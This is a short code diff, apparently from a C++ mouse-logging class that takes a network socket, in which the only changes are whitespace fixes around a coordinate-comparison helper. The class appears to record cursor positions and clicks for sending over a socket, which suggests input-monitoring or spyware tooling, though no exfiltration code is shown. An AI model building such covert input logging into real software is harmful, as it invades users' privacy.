@@ -33,13 +33,13 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 }
 
 // function returns if 2 POINTS are equal
-bool compareCoordinates(POINT a, POINT b) {	return (a.x == b.x && a.y == b.y); }
+bool compareCoordinates(POINT a, POINT b) { return (a.x == b.x && a.y == b.y); }
 
 void MouseLogger::recordMousePos(SOCKET sock)
 {
 	POINT currPos;
 	POINT tempPos;
-	
+
 	GetCursorPos(&currPos);
 	while (true)
 	{
